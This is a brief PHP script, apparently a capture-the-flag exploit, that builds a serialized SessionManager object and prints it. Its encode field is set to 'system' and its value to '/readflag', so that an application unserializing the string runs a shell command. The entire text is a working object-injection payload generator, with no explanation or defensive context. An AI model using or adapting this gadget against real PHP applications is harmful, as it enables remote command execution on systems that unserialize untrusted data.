<?php
class SessionManager
{
    function __construct($redis, $sessid, $fallback, $encode, $decode, $val)
    {
        $this->redis = $redis;
        $this->sessid = $sessid;
        $this->encode = $encode;
        $this->decode = $decode;
        $this->fallback = $fallback;
        $this->val = $val;
    }
}

$x = new SessionManager(null, '', '', 'system', '', '/readflag');
$s = serialize($x);
echo $s;
